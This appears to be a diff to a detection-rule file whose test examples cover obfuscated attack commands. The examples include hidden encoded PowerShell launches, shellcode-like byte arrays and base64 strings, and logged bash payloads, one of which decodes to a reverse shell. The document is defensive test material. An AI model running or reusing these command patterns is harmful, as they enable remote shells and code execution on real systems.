@@ -88,17 +88,17 @@
   examples:
     positive:
       - 'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA'
-      - 'powershell -nop -enc SQBFAFgAIAAoAFsAAAAAAA'
-      - 'powershell -nop -enc kARQBYACAAKABbAAAAAAA'
-      - 'powershell -nop -enc JAEUAWAAgACgAWwAAAAAA'
-      - 'powershell -nop -enc aQBlAHgAIAAoAFsAAAAAAA'
-      - 'powershell -nop -enc kAZQB4ACAAKABbAAAAAAA'
-      - 'powershell -nop -enc pAGUAeAAgACgAWwAAAAAA'
-      - 'powershell -nop -enc aQBlAHgAIAAoAE4AZQB3AAAAAAA'
-      - 'powershell -nop -enc kAZQB4ACAAKABOAGUAdwAAAAAA'
-      - 'powershell -nop -enc pAGUAeAAgACgATgBlAHcAAAAAAA'
-      - 'powershell -nop -enc kARQBYACAAKABOAGUAdwAAAAAA'
-      - 'powershell -nop -enc JAEUAWAAgACgATgBlAHcAAAAAAA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0ASQBFAFgAIAAoAFsAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AkARQBYACAAKABbAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AJAEUAWAAgACgAWwACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AaQBlAHgAIAAoAFsAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AkAZQB4ACAAKABbAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0ApAGUAeAAgACgAWwACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AaQBlAHgAIAAoAE4AZQB3AACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AkAZQB4ACAAKABOAGUAdwACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0ApAGUAeAAgACgATgBlAHcAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AkARQBYACAAKABOAGUAdwACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AJAEUAWAAgACgATgBlAHcAACkA'
     negative:
       - 'powershell -enc RwBlAHQALQBEAGEAdABlAA=='
       - 'Nov 20 12:01:30 web01 app[700]: blob=VwByAGkAdABlAC0ASABvAHMAdAAgAGgAZQBsAGwAbwA='
@@ -134,17 +134,17 @@
   examples:
     positive:
       - 'powershell -enc WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoA'
-      - 'powershell -nop -enc sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgAAAAAAA'
-      - 'powershell -nop -enc bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoAAAAAAA'
-      - 'powershell -nop -enc AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACAAAAAA'
-      - 'powershell -nop -enc BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApAAAAAA'
-      - 'powershell -nop -enc AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKAAAAAA'
-      - 'powershell -nop -enc WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQAAAAAA'
-      - 'powershell -nop -enc sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkAAAAAAA'
-      - 'powershell -nop -enc bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApAAAAAAA'
-      - 'powershell -nop -enc WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAAAAAA'
-      - 'powershell -nop -enc sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgAAAAAAA'
-      - 'powershell -nop -enc bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoAAAAAAA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AsAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AbAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AAFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0ABbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AAWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AsAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AbAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgAACkA'
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden -Enc JAB4AD0AbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoAACkA'
     negative:
       - 'powershell -enc RwBlAHQALQBQAHIAbwBjAGUAcwBzAA=='
       - 'powershell -c "[Reflection.Assembly]::LoadWithPartialName(''System.Windows.Forms'')"'
@@ -243,7 +243,7 @@
   examples:
     positive:
       - '$s=[Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItK")'
-      - '$s=[Convert]::FromBase64String("/OiJAAAAYInlMMAAAA")'
+      - '$buf=[Convert]::FromBase64String("/OiJAAAAYInlMMAAAAMAAAA")'
     negative:
       - '$s=[Convert]::FromBase64String("SGVsbG8gV29ybGQ=")'
       - 'Nov 20 12:04:00 web01 app[700]: cache-key=OiCAAAAX9pQ1'
@@ -272,8 +272,8 @@
     positive:
       - '[Byte[]] $buf = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30'
       - 'buf = b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"'
-      - 'buf = \xfc\xe8\x89\x00\x00\x00\x60\x89\xe5,0x31,0xc0'
-      - 'buf = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0'
+      - 'buf = b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"'
+      - '[Byte[]] $buf = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64'
     negative:
       - '[Byte[]] $key = 0x01,0x02,0x03,0x04,0x05'
       - 'buf = b"\x48\x65\x6c\x6c\x6f"'
@@ -427,13 +427,13 @@
   examples:
     positive:
       - 'Nov 20 12:09:00 web01 java[2001]: payload=bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuNy80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}'
-      - 'Nov 21 09:00:30 web01 java[2001]: payload=echo Jhc2ggLWkgPiYgL2RldiAAAA | base64 -d | bash'
-      - 'Nov 21 09:00:31 web01 java[2001]: payload=echo iYXNoIC1pID4mIC9kZXYvAAAA | base64 -d | bash'
-      - 'Nov 21 09:00:32 web01 java[2001]: payload=echo c2ggLWkgPiYgL2RldiAAAA | base64 -d | bash'
-      - 'Nov 21 09:00:33 web01 java[2001]: payload=echo NoIC1pID4mIC9kZXYvAAAA | base64 -d | bash'
-      - 'Nov 21 09:00:34 web01 java[2001]: payload=echo L2Jpbi9zaCAtaSAyPiYxAAAA | base64 -d | bash'
-      - 'Nov 21 09:00:35 web01 java[2001]: payload=echo 9iaW4vc2ggLWkgMj4mMAAAA | base64 -d | bash'
-      - 'Nov 21 09:00:36 web01 java[2001]: payload=echo vYmluL3NoIC1pIDI+JjAAAA | base64 -d | bash'
+      - 'Nov 21 09:00:01 web01 java[2001]: payload=bash -c {echo,QQJhc2ggLWkgPiYgL2RldiQQ==}|{base64,-d}|{bash,-i}'
+      - 'Nov 21 09:00:02 web01 java[2001]: payload=bash -c {echo,QQiYXNoIC1pID4mIC9kZXYvQQ==}|{base64,-d}|{bash,-i}'
+      - 'Nov 21 09:00:03 web01 java[2001]: payload=bash -c {echo,QQc2ggLWkgPiYgL2RldiQQ==}|{base64,-d}|{bash,-i}'
+      - 'Nov 21 09:00:04 web01 java[2001]: payload=bash -c {echo,QQNoIC1pID4mIC9kZXYvQQ==}|{base64,-d}|{bash,-i}'
+      - 'Nov 21 09:00:05 web01 java[2001]: payload=bash -c {echo,QQL2Jpbi9zaCAtaSAyPiYxQQ==}|{base64,-d}|{bash,-i}'
+      - 'Nov 21 09:00:06 web01 java[2001]: payload=bash -c {echo,QQ9iaW4vc2ggLWkgMj4mMQQ==}|{base64,-d}|{bash,-i}'
+      - 'Nov 21 09:00:07 web01 java[2001]: payload=bash -c {echo,QQvYmluL3NoIC1pIDI+JjQQ==}|{base64,-d}|{bash,-i}'
     negative:
       - 'Nov 20 12:09:01 web01 cloud-init[612]: user-data: IyEvYmluL2Jhc2gKYXB0LWdldCB1cGRhdGUK'
       - 'Nov 20 12:09:02 web01 app[700]: blob=L2V0Yy9ob3N0cw=='
@@ -464,7 +464,7 @@
       - 'Nov 20 12:09:06 web01 app[700]: blob=L2Rldi9udWxs'
 
 - id: mention.encoded_python_exec_decode
-  title: 'Python exec() of a base64 or zlib decoding call'
+  title: 'Python exec() around b64decode or zlib.decompress'
   match:
     anchored: 'exec\( {0,2}(?:(?:__import__\(["'']base64["'']\)\.|base64\.)?b64decode|__import__\(["'']zlib["'']\)\.decompress|zlib\.decompress)\('
   case_sensitive: true
